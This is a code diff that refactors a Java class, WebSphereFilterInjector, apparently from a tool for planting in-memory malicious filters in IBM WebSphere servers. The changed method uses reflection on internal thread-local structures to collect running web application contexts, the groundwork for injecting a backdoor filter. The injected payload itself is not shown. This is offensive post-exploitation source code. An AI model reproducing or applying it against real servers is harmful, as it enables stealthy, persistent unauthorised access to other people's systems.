@@ -9,7 +9,9 @@ import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.HashSet;
 import java.util.List;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 
@@ -36,7 +38,7 @@ public class WebSphereFilterInjector {
     }
 
     public WebSphereFilterInjector() {
-        List<Object> contexts = null;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
@@ -78,27 +80,22 @@ public class WebSphereFilterInjector {
      * com.ibm.ws.webcontainer.webapp.WebAppImpl
      * /opt/IBM/WebSphere/AppServer/plugins/com.ibm.ws.webcontainer.jar
      */
-    public List<Object> getContext() throws Exception {
-        List<Object> contexts = new ArrayList<Object>();
-        Object context;
-        Object obj = getFieldValue(Thread.currentThread(), "wsThreadLocals");
-        Object[] wsThreadLocals = (Object[]) obj;
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<Object>();
+        Object[] wsThreadLocals = (Object[]) getFieldValue(Thread.currentThread(), "wsThreadLocals");
         for (Object wsThreadLocal : wsThreadLocals) {
-            obj = wsThreadLocal;
             // for websphere 7.x
-            if (obj != null && obj.getClass().getName().endsWith("FastStack")) {
-                Object[] stackList = (Object[]) getFieldValue(obj, "stack");
+            if (wsThreadLocal != null && wsThreadLocal.getClass().getName().endsWith("FastStack")) {
+                Object[] stackList = (Object[]) getFieldValue(wsThreadLocal, "stack");
                 for (Object stack : stackList) {
                     try {
                         Object config = getFieldValue(stack, "config");
-                        context = getFieldValue(getFieldValue(config, "context"), "context");
-                        contexts.add(context);
+                        contexts.add(getFieldValue(getFieldValue(config, "context"), "context"));
                     } catch (Exception ignored) {
                     }
                 }
-            } else if (obj != null && obj.getClass().getName().endsWith("WebContainerRequestState")) {
-                context = getFieldValue(getFieldValue(getFieldValue(getFieldValue(getFieldValue(obj, "currentThreadsIExtendedRequest"), "_dispatchContext"), "_webapp"), "facade"), "context");
-                contexts.add(context);
+            } else if (wsThreadLocal != null && wsThreadLocal.getClass().getName().endsWith("WebContainerRequestState")) {;
+                contexts.add(getFieldValue(getFieldValue(getFieldValue(getFieldValue(getFieldValue(wsThreadLocal, "currentThreadsIExtendedRequest"), "_dispatchContext"), "_webapp"), "facade"), "context"));
             }
         }
         return contexts;
